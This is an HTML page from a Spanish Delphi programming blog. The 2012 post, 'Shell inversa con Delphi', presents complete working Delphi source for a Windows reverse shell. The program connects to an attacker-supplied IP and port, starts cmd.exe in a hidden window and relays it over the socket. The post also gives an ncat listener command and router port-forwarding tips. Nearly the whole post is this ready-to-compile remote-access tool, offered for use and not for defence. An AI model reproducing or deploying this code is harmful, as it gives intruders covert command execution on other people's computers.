<!DOCTYPE html>
<html lang="es" dir="ltr" prefix="content: http://purl.org/rss/1.0/modules/content/ dc: http://purl.org/dc/terms/ foaf: http://xmlns.com/foaf/0.1/ og: http://ogp.me/ns# rdfs: http://www.w3.org/2000/01/rdf-schema# sioc: http://rdfs.org/sioc/ns# sioct: http://rdfs.org/sioc/types# skos: http://www.w3.org/2004/02/skos/core# xsd: http://www.w3.org/2001/XMLSchema#">
<head>
  <link rel="profile" href="http://www.w3.org/1999/xhtml/vocab" />
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" href="/sites/delphi.jmrds.com/themes/bootstrap/favicon.ico" type="image/vnd.microsoft.icon" />
<link rel="shortlink" href="/node/81" />
<link rel="canonical" href="/node/81" />
<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
  <title>Shell inversa con Delphi | La web de Seoane</title>
  <style>
@import url("/modules/system/system.base.css?");
</style>
<style>
@import url("/modules/field/theme/field.css?");
@import url("/modules/node/node.css?");
</style>
<style>
@import url("/sites/delphi.jmrds.com/modules/geshifilter/geshifilter.css?");
</style>
<link type="text/css" rel="stylesheet" href="//cdn.jsdelivr.net/bootstrap/3.3.5/css/bootstrap.css" media="all" />
<style>
@import url("/sites/delphi.jmrds.com/themes/bootstrap/css/3.3.5/overrides.min.css?");
</style>
  <!-- HTML5 element support for IE6-8 -->
  <!--[if lt IE 9]>
    <script src="https://cdn.jsdelivr.net/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
  <![endif]-->
  <script src="/sites/delphi.jmrds.com/modules/jquery_update/replace/jquery/1.10/jquery.min.js?v=1.10.2"></script>
<script src="/misc/jquery.once.js?v=1.2"></script>
<script src="/misc/drupal.js?"></script>
<script src="//cdn.jsdelivr.net/bootstrap/3.3.5/js/bootstrap.js"></script>
<script src="/sites/delphi.jmrds.com/files/languages/es_sB9mP1iixuFRbyZKZVySK7xrSW_2-LRj1vNEXyqwOu8.js?"></script>
<script>jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bootstrap","theme_token":"-iRc9l8IWbw6QU7ksZaLn3O_vkb3SQRSpfxJ62iiK6Y","js":{"sites\/delphi.jmrds.com\/themes\/bootstrap\/js\/bootstrap.js":1,"sites\/delphi.jmrds.com\/modules\/jquery_update\/replace\/jquery\/1.10\/jquery.min.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1,"\/\/cdn.jsdelivr.net\/bootstrap\/3.3.5\/js\/bootstrap.js":1,"public:\/\/languages\/es_sB9mP1iixuFRbyZKZVySK7xrSW_2-LRj1vNEXyqwOu8.js":1},"css":{"modules\/system\/system.base.css":1,"modules\/field\/theme\/field.css":1,"modules\/node\/node.css":1,"sites\/delphi.jmrds.com\/modules\/geshifilter\/geshifilter.css":1,"\/\/cdn.jsdelivr.net\/bootstrap\/3.3.5\/css\/bootstrap.css":1,"sites\/delphi.jmrds.com\/themes\/bootstrap\/css\/3.3.5\/overrides.min.css":1}},"bootstrap":{"anchorsFix":"0","anchorsSmoothScrolling":"0","formHasError":1,"popoverEnabled":"1","popoverOptions":{"animation":1,"html":0,"placement":"right","selector":"","trigger":"click","triggerAutoclose":1,"title":"","content":"","delay":0,"container":"body"},"tooltipEnabled":"1","tooltipOptions":{"animation":1,"html":0,"placement":"auto left","selector":"","trigger":"hover focus","delay":0,"container":"body"}}});</script>
</head>
<body class="html not-front not-logged-in no-sidebars page-node page-node- page-node-81 node-type-article">
  <div id="skip-link">
    <a href="#main-content" class="element-invisible element-focusable">Pasar al contenido principal</a>
  </div>
    <header id="navbar" role="banner" class="navbar container navbar-default">
  <div class="container">
    <div class="navbar-header">
              <a class="logo navbar-btn pull-left" href="/" title="Inicio">
          <img src="/sites/delphi.jmrds.com/themes/bootstrap/logo.png" alt="Inicio" />
        </a>
      
              <a class="name navbar-brand" href="/" title="Inicio">La web de Seoane</a>
      
              <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar-collapse">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
          </div>

          <div class="navbar-collapse collapse" id="navbar-collapse">
        <nav role="navigation">
                      <ul class="menu nav navbar-nav"><li class="first leaf"><a href="/" title="">Inicio</a></li>
<li class="leaf"><a href="/search/node" title="">Buscar</a></li>
<li class="leaf"><a href="/rss.xml" title="">RSS</a></li>
<li class="leaf"><a href="/node/26" title="">Contacto</a></li>
<li class="last leaf"><a href="/user/login" title="">Login</a></li>
</ul>                                      </nav>
      </div>
      </div>
</header>

<div class="main-container container">

  <header role="banner" id="page-header">
    
      </header> <!-- /#page-header -->

  <div class="row">

    
    <section class="col-sm-12">
                  <a id="main-content"></a>
                    <h1 class="page-header">Shell inversa con Delphi</h1>
                                                          <div class="region region-content">
    <section id="block-system-main" class="block block-system clearfix">

      
  <article id="node-81" class="node node-article node-promoted clearfix" about="/node/81" typeof="sioc:Item foaf:Document">
    <header>
            <span property="dc:title" content="Shell inversa con Delphi" class="rdf-meta element-hidden"></span><span property="sioc:num_replies" content="0" datatype="xsd:integer" class="rdf-meta element-hidden"></span>        <span class="submitted">
            <span property="dc:date dc:created" content="2012-06-25T21:13:58+02:00" datatype="xsd:dateTime" rel="sioc:has_creator">Enviado por <span class="username" xml:lang="" about="/user/1" typeof="sioc:UserAccount" property="foaf:name" datatype="">admin</span> el Lun, 06/25/2012 - 21:13</span>    </span>
      </header>
    <div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even" property="content:encoded"><p>El siguiente código muestra como crear un shell inversa, es decir, si ejecutamos este programa en un ordenador remoto intentara conectarse con nosotros para darnos acceso remoto a la shell.</p>
<!--break--><p>Su funcionamiento es sencillo, primero tenemos que prepara el servidor, por ejemplo usando ncat:</p>
<div class="geshifilter">
<pre class="text geshifilter-text" style="font-family:monospace;">ncat -l 55555</pre></div>
<p>De esta manera ncat se queda esperando en el puerto 55555 a que nuestro programa establezca una conexión. Si el ordenador remoto se encuentra fuera de nuestra red local también tendremos que configurar nuestro router para que redirija ese puerto hacia nuestro equipo.</p>
<p>Ahora solo tenemos que ejecutar nuestro programa en el ordenador remoto indicándole nuestra ip (para probar podemos usar la local 127.0.0.1) y el puerto que debe usar:</p>
<div class="geshifilter">
<pre class="text geshifilter-text" style="font-family:monospace;">rshell 127.0.0.1 55555</pre></div>
<p>El programa entonces se conectara y desde el ncat podremos manejar la consola remota como si la tuviéramos delante de nosotros. Una vez que terminemos de utilizarla mandaremos el comando "Exit" para que la shell se cierre y la conexión se corte.</p>
<p>Ahora el código:</p>
<div class="geshifilter">
<pre class="delphi geshifilter-delphi" style="font-family:monospace;"><span style="color: #000000; font-weight: bold;">program</span> rshell<span style="color: #000066;">;</span>
 
<span style="color: #008000; font-style: italic;">{$APPTYPE CONSOLE}</span>
 
<span style="color: #000000; font-weight: bold;">uses</span>
  Windows<span style="color: #000066;">,</span> SysUtils<span style="color: #000066;">,</span> Winsock<span style="color: #000066;">;</span>
 
<span style="color: #808080; font-style: italic;">// Comprueba la version de windows</span>
<span style="color: #000000; font-weight: bold;">function</span> IsWinNT<span style="color: #000066;">:</span> <span style="color: #000066; font-weight: bold;">boolean</span><span style="color: #000066;">;</span>
<span style="color: #000000; font-weight: bold;">var</span>
  Osv<span style="color: #000066;">:</span> OSVERSIONINFO<span style="color: #000066;">;</span>
<span style="color: #000000; font-weight: bold;">begin</span>
  Osv<span style="color: #000066;">.</span><span style="color: #006600;">dwOSVersionInfoSize</span><span style="color: #000066;">:</span><span style="color: #000066;">=</span> <span style="color: #000066;">SizeOf</span><span style="color: #000066;">(</span>Osv<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
  GetVersionEx<span style="color: #000066;">(</span>OSV<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
  Result<span style="color: #000066;">:</span><span style="color: #000066;">=</span> Osv<span style="color: #000066;">.</span><span style="color: #006600;">dwPlatformId</span> <span style="color: #000066;">=</span> VER_PLATFORM_WIN32_NT<span style="color: #000066;">;</span>
<span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span>
 
<span style="color: #000000; font-weight: bold;">const</span>
  BUFFERSIZE <span style="color: #000066;">=</span> <span style="color: #0000ff;">4</span><span style="color: #000066;">*</span><span style="color: #0000ff;">1024</span><span style="color: #000066;">;</span>
 
<span style="color: #808080; font-style: italic;">// Bucle de lectura/escritura</span>
<span style="color: #000000; font-weight: bold;">procedure</span> Loop<span style="color: #000066;">(</span>S<span style="color: #000066;">:</span> TSocket<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
<span style="color: #000000; font-weight: bold;">var</span>
  Si<span style="color: #000066;">:</span> STARTUPINFO<span style="color: #000066;">;</span>
  Sa<span style="color: #000066;">:</span> SECURITY_ATTRIBUTES<span style="color: #000066;">;</span>
  Sd<span style="color: #000066;">:</span> SECURITY_DESCRIPTOR<span style="color: #000066;">;</span>
  Pi<span style="color: #000066;">:</span> PROCESS_INFORMATION<span style="color: #000066;">;</span>
  Stdin<span style="color: #000066;">,</span> Stdout<span style="color: #000066;">,</span> WStdin<span style="color: #000066;">,</span> RStdout<span style="color: #000066;">:</span> <span style="color: #000066; font-weight: bold;">THandle</span><span style="color: #000066;">;</span>
  Exitcod<span style="color: #000066;">,</span> Bread<span style="color: #000066;">,</span> Avail<span style="color: #000066;">:</span> <span style="color: #000066; font-weight: bold;">Cardinal</span><span style="color: #000066;">;</span>
  FDSet<span style="color: #000066;">:</span> TFDSet<span style="color: #000066;">;</span>
  TimeVal<span style="color: #000066;">:</span> TTimeVal<span style="color: #000066;">;</span>
  Buffer<span style="color: #000066;">:</span> <span style="color: #000066; font-weight: bold;">PAnsiChar</span><span style="color: #000066;">;</span>
<span style="color: #000000; font-weight: bold;">begin</span>
  <span style="color: #000000; font-weight: bold;">if</span> IsWinNT <span style="color: #000000; font-weight: bold;">then</span>
  <span style="color: #000000; font-weight: bold;">begin</span>
    InitializeSecurityDescriptor<span style="color: #000066;">(</span><span style="color: #000066;">@</span>Sd<span style="color: #000066;">,</span> SECURITY_DESCRIPTOR_REVISION<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
    SetSecurityDescriptorDacl<span style="color: #000066;">(</span><span style="color: #000066;">@</span>Sd<span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">TRUE</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">nil</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">FALSE</span><span style="color: #000066;">)</span><span style="color: #000066;">;</span>
    Sa<span style="color: #000066;">.</span><span style="color: #006600;">lpSecurityDescriptor</span><span style="color: #000066;">:</span><span style="color: #000066;">=</span> <span style="color: #000066;">@</span>Sd<span style="color: #000066;">;</span>
  <span style="color: #000000; font-weight: bold;">end</span> <span style="color: #000000; font-weight: bold;">else</span>
    Sa<span style="color: #000066;">.</span><span style="color: #006600;">lpSecurityDescriptor</span><span style="color: #000066;">:</span><span style="color: #000066;">=</span> <span style="color: #000000; font-weight: bold;">nil</span><span style="color: #000066;">;</span>
  Sa<span style="color: #000066;">.</span><span style="color: #006600;">nLength</span><span style="color: #000066;">:</span><span style="color: #000066;">=</span> <span style="color: #000066;">SizeOf</span><span style="color: #000066;">(</span>SECURITY_ATTRIBUTES<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
  Sa<span style="color: #000066;">.</span><span style="color: #006600;">bInheritHandle</span> <span style="color: #000066;">:</span><span style="color: #000066;">=</span> <span style="color: #000000; font-weight: bold;">TRUE</span><span style="color: #000066;">;</span>
  <span style="color: #808080; font-style: italic;">// Creamos la tuberia de entrada</span>
  <span style="color: #000000; font-weight: bold;">if</span> CreatePipe<span style="color: #000066;">(</span>Stdin<span style="color: #000066;">,</span> WStdin<span style="color: #000066;">,</span> <span style="color: #000066;">@</span>Sa<span style="color: #000066;">,</span> <span style="color: #0000ff;">0</span><span style="color: #000066;">)</span> <span style="color: #000000; font-weight: bold;">then</span>
  <span style="color: #000000; font-weight: bold;">begin</span>
    <span style="color: #808080; font-style: italic;">// Creamos la tuberia de salida</span>
    <span style="color: #000000; font-weight: bold;">if</span> CreatePipe<span style="color: #000066;">(</span>RStdout<span style="color: #000066;">,</span> Stdout<span style="color: #000066;">,</span> <span style="color: #000066;">@</span>Sa<span style="color: #000066;">,</span> <span style="color: #0000ff;">0</span><span style="color: #000066;">)</span> <span style="color: #000000; font-weight: bold;">then</span>
    <span style="color: #000000; font-weight: bold;">begin</span>
      GetStartupInfo<span style="color: #000066;">(</span>Si<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
      <span style="color: #000000; font-weight: bold;">with</span> Si <span style="color: #000000; font-weight: bold;">do</span>
      <span style="color: #000000; font-weight: bold;">begin</span>
        dwFlags<span style="color: #000066;">:</span><span style="color: #000066;">=</span> STARTF_USESTDHANDLES <span style="color: #000000; font-weight: bold;">or</span> STARTF_USESHOWWINDOW<span style="color: #000066;">;</span>
        wShowWindow<span style="color: #000066;">:</span><span style="color: #000066;">=</span> SW_HIDE<span style="color: #000066;">;</span>
        <span style="color: #808080; font-style: italic;">// Indicamos que tuberias debe de usar el proceso</span>
        hStdOutput<span style="color: #000066;">:</span><span style="color: #000066;">=</span> Stdout<span style="color: #000066;">;</span>
        hStdError<span style="color: #000066;">:</span><span style="color: #000066;">=</span> Stdout<span style="color: #000066;">;</span>
        hStdInput<span style="color: #000066;">:</span><span style="color: #000066;">=</span> Stdin<span style="color: #000066;">;</span>
      <span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span>
      <span style="color: #808080; font-style: italic;">// Reservamos memoria para el buffer</span>
      <span style="color: #000066;">GetMem</span><span style="color: #000066;">(</span>Buffer<span style="color: #000066;">,</span>BUFFERSIZE<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
      <span style="color: #000000; font-weight: bold;">try</span>
        <span style="color: #000066;">Fillchar</span><span style="color: #000066;">(</span>Buffer<span style="color: #000066;">^</span><span style="color: #000066;">,</span> BUFFERSIZE<span style="color: #000066;">,</span> <span style="color: #ff0000;">#0</span><span style="color: #000066;">)</span><span style="color: #000066;">;</span>
        <span style="color: #808080; font-style: italic;">// Obtenemos la ruta de la shell</span>
        <span style="color: #000066;">GetEnvironmentVariable</span><span style="color: #000066;">(</span><span style="color: #ff0000;">'COMSPEC'</span><span style="color: #000066;">,</span> Buffer<span style="color: #000066;">,</span> BUFFERSIZE <span style="color: #000066;">-</span> <span style="color: #0000ff;">1</span><span style="color: #000066;">)</span><span style="color: #000066;">;</span>
        <span style="color: #808080; font-style: italic;">// Ejecutamos la shell</span>
        <span style="color: #000000; font-weight: bold;">if</span> CreateProcess<span style="color: #000066;">(</span><span style="color: #000000; font-weight: bold;">nil</span><span style="color: #000066;">,</span> Buffer<span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">nil</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">nil</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">TRUE</span><span style="color: #000066;">,</span> CREATE_NEW_CONSOLE<span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">nil</span><span style="color: #000066;">,</span>
          <span style="color: #000000; font-weight: bold;">nil</span><span style="color: #000066;">,</span> Si<span style="color: #000066;">,</span> Pi<span style="color: #000066;">)</span> <span style="color: #000000; font-weight: bold;">then</span>
        <span style="color: #000000; font-weight: bold;">begin</span>
          <span style="color: #000000; font-weight: bold;">repeat</span>
            <span style="color: #808080; font-style: italic;">// Comprobamos si hay algo que leer de la shell</span>
            PeekNamedPipe<span style="color: #000066;">(</span>RStdout<span style="color: #000066;">,</span> Buffer<span style="color: #000066;">,</span> BUFFERSIZE<span style="color: #000066;">-</span><span style="color: #0000ff;">1</span><span style="color: #000066;">,</span> <span style="color: #000066;">@</span>Bread<span style="color: #000066;">,</span> <span style="color: #000066;">@</span>Avail<span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">nil</span><span style="color: #000066;">)</span><span style="color: #000066;">;</span>
            <span style="color: #000000; font-weight: bold;">if</span> bread &gt; <span style="color: #0000ff;">0</span> <span style="color: #000000; font-weight: bold;">then</span>
            <span style="color: #000000; font-weight: bold;">begin</span>
              <span style="color: #000066;">Fillchar</span><span style="color: #000066;">(</span>Buffer<span style="color: #000066;">^</span><span style="color: #000066;">,</span> BUFFERSIZE<span style="color: #000066;">,</span> <span style="color: #ff0000;">#0</span><span style="color: #000066;">)</span><span style="color: #000066;">;</span>
              <span style="color: #808080; font-style: italic;">// Leemos la shell</span>
              ReadFile<span style="color: #000066;">(</span>RStdout<span style="color: #000066;">,</span> Buffer<span style="color: #000066;">^</span><span style="color: #000066;">,</span> Bread<span style="color: #000066;">,</span> Bread<span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">nil</span><span style="color: #000066;">)</span><span style="color: #000066;">;</span>
              <span style="color: #808080; font-style: italic;">// Escribimos los datos en el socket</span>
              Send<span style="color: #000066;">(</span>S<span style="color: #000066;">,</span>Buffer<span style="color: #000066;">^</span><span style="color: #000066;">,</span>Bread<span style="color: #000066;">,</span><span style="color: #0000ff;">0</span><span style="color: #000066;">)</span>
            <span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span>
 
            TimeVal<span style="color: #000066;">.</span><span style="color: #006600;">tv_sec</span><span style="color: #000066;">:</span><span style="color: #000066;">=</span> <span style="color: #0000ff;">0</span><span style="color: #000066;">;</span>
            TimeVal<span style="color: #000066;">.</span><span style="color: #006600;">tv_usec</span><span style="color: #000066;">:</span><span style="color: #000066;">=</span> <span style="color: #0000ff;">10</span><span style="color: #000066;">;</span>
            FD_ZERO<span style="color: #000066;">(</span>FDSet<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
            FD_SET<span style="color: #000066;">(</span>S<span style="color: #000066;">,</span> FDSet<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
            <span style="color: #808080; font-style: italic;">// Comprobamos si hay algo que leer en el socket</span>
            <span style="color: #000000; font-weight: bold;">if</span> Select<span style="color: #000066;">(</span><span style="color: #0000ff;">0</span><span style="color: #000066;">,</span> <span style="color: #000066;">@</span>FDSet<span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">nil</span><span style="color: #000066;">,</span> <span style="color: #000000; font-weight: bold;">nil</span><span style="color: #000066;">,</span> <span style="color: #000066;">@</span>TimeVal<span style="color: #000066;">)</span> &gt; <span style="color: #0000ff;">0</span> <span style="color: #000000; font-weight: bold;">then</span>
            <span style="color: #000000; font-weight: bold;">begin</span>
              <span style="color: #808080; font-style: italic;">// Leemos los datos del socket</span>
              BRead<span style="color: #000066;">:</span><span style="color: #000066;">=</span> Recv<span style="color: #000066;">(</span>S<span style="color: #000066;">,</span> Buffer<span style="color: #000066;">^</span><span style="color: #000066;">,</span> BUFFERSIZE<span style="color: #000066;">-</span><span style="color: #0000ff;">1</span><span style="color: #000066;">,</span> <span style="color: #0000ff;">0</span><span style="color: #000066;">)</span><span style="color: #000066;">;</span>
              <span style="color: #000000; font-weight: bold;">if</span> <span style="color: #000066;">(</span>BRead &lt;&gt; <span style="color: #000066; font-weight: bold;">Cardinal</span><span style="color: #000066;">(</span>SOCKET_ERROR<span style="color: #000066;">)</span><span style="color: #000066;">)</span> <span style="color: #000000; font-weight: bold;">and</span> <span style="color: #000066;">(</span>BRead &gt; <span style="color: #0000ff;">0</span><span style="color: #000066;">)</span> <span style="color: #000000; font-weight: bold;">then</span>
                <span style="color: #808080; font-style: italic;">// y los escribimos en la shell</span>
                WriteFile<span style="color: #000066;">(</span>WStdin<span style="color: #000066;">,</span>Buffer<span style="color: #000066;">^</span><span style="color: #000066;">,</span>Bread<span style="color: #000066;">,</span>Avail<span style="color: #000066;">,</span><span style="color: #000000; font-weight: bold;">nil</span><span style="color: #000066;">)</span><span style="color: #000066;">;</span>
            <span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span>
 
            <span style="color: #808080; font-style: italic;">// Comprobamos si se ha cerrado la shell</span>
            GetExitCodeProcess<span style="color: #000066;">(</span>Pi<span style="color: #000066;">.</span><span style="color: #006600;">hProcess</span><span style="color: #000066;">,</span> Exitcod<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
          <span style="color: #000000; font-weight: bold;">until</span> <span style="color: #000066;">(</span>Exitcod &lt;&gt; STILL_ACTIVE<span style="color: #000066;">)</span> <span style="color: #000000; font-weight: bold;">and</span> <span style="color: #000066;">(</span>Bread <span style="color: #000066;">=</span> <span style="color: #0000ff;">0</span><span style="color: #000066;">)</span><span style="color: #000066;">;</span>
        <span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span>
      <span style="color: #000000; font-weight: bold;">finally</span>
        <span style="color: #808080; font-style: italic;">// Liberamos la memoria reservada</span>
        <span style="color: #000066;">FreeMem</span><span style="color: #000066;">(</span>Buffer<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
      <span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span>
      <span style="color: #808080; font-style: italic;">// Cerramos la tuberia de salida</span>
      CloseHandle<span style="color: #000066;">(</span>RStdout<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
      CloseHandle<span style="color: #000066;">(</span>Stdout<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
    <span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span>
    <span style="color: #808080; font-style: italic;">// Cerramos la tuberia de entrada</span>
    CloseHandle<span style="color: #000066;">(</span>Stdin<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
    CloseHandle<span style="color: #000066;">(</span>WStdin<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
  <span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span>
<span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span>
 
<span style="color: #808080; font-style: italic;">// Estable la conexion y devuelve un socket</span>
<span style="color: #000000; font-weight: bold;">function</span> Conectar<span style="color: #000066;">(</span>Servidor<span style="color: #000066;">:</span> <span style="color: #000066; font-weight: bold;">AnsiString</span><span style="color: #000066;">;</span> Puerto<span style="color: #000066;">:</span> <span style="color: #000066; font-weight: bold;">Word</span><span style="color: #000066;">)</span><span style="color: #000066;">:</span> TSocket<span style="color: #000066;">;</span>
<span style="color: #000000; font-weight: bold;">var</span>
  Address<span style="color: #000066;">:</span> u_long<span style="color: #000066;">;</span>
  HostEnt<span style="color: #000066;">:</span> phostent<span style="color: #000066;">;</span>
  Addr<span style="color: #000066;">:</span> sockaddr_in<span style="color: #000066;">;</span>
<span style="color: #000000; font-weight: bold;">begin</span>
  Result<span style="color: #000066;">:</span><span style="color: #000066;">=</span> INVALID_SOCKET<span style="color: #000066;">;</span>
  <span style="color: #808080; font-style: italic;">//Compruebo si se una direccion ip</span>
  Address<span style="color: #000066;">:</span><span style="color: #000066;">=</span> inet_addr<span style="color: #000066;">(</span><span style="color: #000066; font-weight: bold;">PAnsiChar</span><span style="color: #000066;">(</span>Servidor<span style="color: #000066;">)</span><span style="color: #000066;">)</span><span style="color: #000066;">;</span>
  <span style="color: #000000; font-weight: bold;">if</span> Address <span style="color: #000066;">=</span> INADDR_NONE <span style="color: #000000; font-weight: bold;">then</span>
  <span style="color: #000000; font-weight: bold;">begin</span>
    <span style="color: #808080; font-style: italic;">// Si no es una ip, intento resolver el nombre</span>
    HostEnt<span style="color: #000066;">:</span><span style="color: #000066;">=</span> gethostbyname<span style="color: #000066;">(</span><span style="color: #000066; font-weight: bold;">PAnsiChar</span><span style="color: #000066;">(</span>Servidor<span style="color: #000066;">)</span><span style="color: #000066;">)</span><span style="color: #000066;">;</span>
    <span style="color: #000000; font-weight: bold;">if</span> HostEnt &lt;&gt; <span style="color: #000000; font-weight: bold;">nil</span> <span style="color: #000000; font-weight: bold;">then</span>
      Address<span style="color: #000066;">:</span><span style="color: #000066;">=</span> PInAddr<span style="color: #000066;">(</span>HostEnt<span style="color: #000066;">.</span><span style="color: #006600;">h_addr_list</span><span style="color: #000066;">^</span><span style="color: #000066;">)</span><span style="color: #000066;">^</span><span style="color: #000066;">.</span><span style="color: #006600;">S_addr</span><span style="color: #000066;">;</span>
  <span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span>
  <span style="color: #808080; font-style: italic;">// Si tengo una ip valida</span>
  <span style="color: #000000; font-weight: bold;">if</span> Address &lt;&gt; INADDR_NONE <span style="color: #000000; font-weight: bold;">then</span>
  <span style="color: #000000; font-weight: bold;">begin</span>
    <span style="color: #808080; font-style: italic;">// Creo un socket</span>
    Result<span style="color: #000066;">:</span><span style="color: #000066;">=</span> Socket<span style="color: #000066;">(</span>AF_INET<span style="color: #000066;">,</span> SOCK_STREAM<span style="color: #000066;">,</span> <span style="color: #0000ff;">0</span><span style="color: #000066;">)</span><span style="color: #000066;">;</span>
    <span style="color: #000000; font-weight: bold;">if</span> Result &lt;&gt; INVALID_SOCKET <span style="color: #000000; font-weight: bold;">then</span>
    <span style="color: #000000; font-weight: bold;">begin</span>
      Addr<span style="color: #000066;">.</span><span style="color: #006600;">sin_family</span><span style="color: #000066;">:</span><span style="color: #000066;">=</span> AF_INET<span style="color: #000066;">;</span>
      Addr<span style="color: #000066;">.</span><span style="color: #006600;">sin_addr</span><span style="color: #000066;">.</span><span style="color: #006600;">S_addr</span><span style="color: #000066;">:</span><span style="color: #000066;">=</span> Address<span style="color: #000066;">;</span>
      Addr<span style="color: #000066;">.</span><span style="color: #006600;">sin_port</span><span style="color: #000066;">:</span><span style="color: #000066;">=</span> htons<span style="color: #000066;">(</span>Puerto<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
      <span style="color: #808080; font-style: italic;">// Conecto el socket a la direccion ip</span>
      <span style="color: #000000; font-weight: bold;">if</span> Connect<span style="color: #000066;">(</span>Result<span style="color: #000066;">,</span> Addr<span style="color: #000066;">,</span> <span style="color: #000066;">Sizeof</span><span style="color: #000066;">(</span>Addr<span style="color: #000066;">)</span><span style="color: #000066;">)</span> <span style="color: #000066;">=</span> SOCKET_ERROR <span style="color: #000000; font-weight: bold;">then</span>
      <span style="color: #000000; font-weight: bold;">begin</span>
        <span style="color: #808080; font-style: italic;">// Si algo va mal cierro el socket</span>
        CloseSocket<span style="color: #000066;">(</span>Result<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
        Result<span style="color: #000066;">:</span><span style="color: #000066;">=</span> INVALID_SOCKET<span style="color: #000066;">;</span>
      <span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span>
    <span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span>
  <span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span>
<span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span>
 
<span style="color: #000000; font-weight: bold;">var</span>
  S<span style="color: #000066;">:</span> TSocket<span style="color: #000066;">;</span>
  WSAData<span style="color: #000066;">:</span> TWSADATA<span style="color: #000066;">;</span>
<span style="color: #000000; font-weight: bold;">begin</span>
  <span style="color: #808080; font-style: italic;">// Iniciamos las librerias</span>
  <span style="color: #000000; font-weight: bold;">if</span> WSAStartup<span style="color: #000066;">(</span>MAKEWORD<span style="color: #000066;">(</span><span style="color: #0000ff;">1</span><span style="color: #000066;">,</span> <span style="color: #0000ff;">1</span><span style="color: #000066;">)</span><span style="color: #000066;">,</span> WSADATA<span style="color: #000066;">)</span> <span style="color: #000066;">=</span> <span style="color: #0000ff;">0</span> <span style="color: #000000; font-weight: bold;">then</span>
  <span style="color: #000000; font-weight: bold;">try</span>
    <span style="color: #808080; font-style: italic;">// Intentamos conectarnos al servidor</span>
    S<span style="color: #000066;">:</span><span style="color: #000066;">=</span> Conectar<span style="color: #000066;">(</span><span style="color: #000066;">ParamStr</span><span style="color: #000066;">(</span><span style="color: #0000ff;">1</span><span style="color: #000066;">)</span><span style="color: #000066;">,</span><span style="color: #000066;">StrToIntDef</span><span style="color: #000066;">(</span><span style="color: #000066;">ParamStr</span><span style="color: #000066;">(</span><span style="color: #0000ff;">2</span><span style="color: #000066;">)</span><span style="color: #000066;">,</span><span style="color: #0000ff;">55555</span><span style="color: #000066;">)</span><span style="color: #000066;">)</span><span style="color: #000066;">;</span>
    <span style="color: #000000; font-weight: bold;">if</span> S &lt;&gt; INVALID_SOCKET <span style="color: #000000; font-weight: bold;">then</span>
    <span style="color: #000000; font-weight: bold;">try</span>
      Loop<span style="color: #000066;">(</span>S<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
    <span style="color: #000000; font-weight: bold;">finally</span>
      <span style="color: #808080; font-style: italic;">// Cerramos el socket</span>
      CloseSocket<span style="color: #000066;">(</span>S<span style="color: #000066;">)</span><span style="color: #000066;">;</span>
    <span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span>
  <span style="color: #000000; font-weight: bold;">finally</span>
    <span style="color: #808080; font-style: italic;">// Limpiamos todo</span>
    WSACleanup<span style="color: #000066;">;</span>  
  <span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">;</span>
<span style="color: #000000; font-weight: bold;">end</span><span style="color: #000066;">.</span></pre></div>
<p>Enlaces de interés:<br /><a href="http://nmap.org/ncat/">http://nmap.org/ncat/</a></p>
</div></div></div>    <footer>
        <ul class="links list-inline"><li class="comment_forbidden first last"></li>
</ul>  </footer>
    </article>

</section>
  </div>
    </section>

    
  </div>
</div>

  <footer class="footer container">
      <div class="region region-footer">
    <section id="block-menu-menu-enlaces" class="block block-menu clearfix">

        <h2 class="block-title">Enlaces interesantes</h2>
    
